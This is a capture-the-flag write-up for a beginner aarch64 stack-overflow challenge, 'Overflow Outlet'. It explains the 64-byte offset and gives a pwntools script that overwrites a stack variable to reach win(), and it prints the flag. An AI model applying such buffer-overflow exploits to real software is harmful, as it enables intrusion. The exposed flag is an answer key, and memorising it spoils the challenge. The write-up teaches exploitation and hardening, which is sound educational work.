# Overflow Outlet  -  Solution

**Flag:** `rstcon{st4ck_sm4sh_opens_the_v4lve}`

## Analysis

### The admin red herring

`vuln()` seeds `gate` from `check_admin()`, which reads `/sys/config/admin.xml`
and parses the value out of an `<admin>...</admin>` tag. If that value is the
magic constant, `gate` starts out already open and `win()` fires with no input.
It looks like the intended way in, but it is a dead dev-era path: the config was
pulled before shipping, so `/sys/config/admin.xml` never exists on the server
and `check_admin()` returns 0, leaving `gate` closed. The parse is real (a valid
file would unlock the outlet), you just can't create the file, so it is a
distraction from the actual bug. The overflow below is the only live route.

### The overflow

The vulnerable function has a 64 byte input buffer and an 8 byte gate as
separate stack locals:

```c
char buf[64];
unsigned long long gate = 0;
read(0, buf, 256);            // reads up to 256 bytes into a 64 byte buffer
if (gate == 0xCAFEBABEDEADBEEF) win();
```

The binary is a static **aarch64** executable (the challenge server runs it
under `qemu-user`). At `-O0` gcc puts `buf` low in the frame and `gate` above
it, so overflowing `buf` runs forward into `gate`. Reading 256 bytes into a 64
byte buffer reaches it easily.

Disassembly gives the exact layout: `read` fills `buf` at `sp+0x18`, and the
compare reads `gate` at `sp+88`. That is `88 - 0x18 = 64` bytes from the start
of `buf` to `gate` — no padding on this target (and the saved `x29/x30` sit
*below* `buf`, so the forward overflow never touches them). `win()` reads the
flag from the outlet's valve-key device (`/dev/valvekey`, falling back to a
local `flag.txt`) and prints it, and it is never called on the normal path.

## Exploit

Write 64 filler bytes to reach `gate`, then the 8 byte magic value, little
endian:

```python
from pwn import *
# remote, or locally: process(['qemu-aarch64-static', './outlet'])
io = remote(HOST, 9001)
io.recvuntil(b'sequence:')
io.send(b'A'*64 + p64(0xCAFEBABEDEADBEEF))
print(io.recvall().decode())       # Valve open. rstcon{...}
```

`writeup/solve.py` runs against the remote service, or locally under
`qemu-aarch64-static`.

## Finding the offset without source

If only the binary is distributed: send a cyclic pattern, see which 8 bytes land
in the compare, or just step the input length until the "Valve stays shut"
message flips. On this aarch64 build the offset is 64 (`buf` is 64 bytes with no
padding before `gate`), but confirm it from the binary rather than assuming.

## Notes

- No stack canary (`-fno-stack-protector`) and no PIE, so this stays a pure
  variable overwrite with no leak required. Good first pwn for the track.
- Hardening lesson: bound the read to `sizeof(buf)`, and a canary would have
  caught a return address overwrite if the challenge escalated to one.
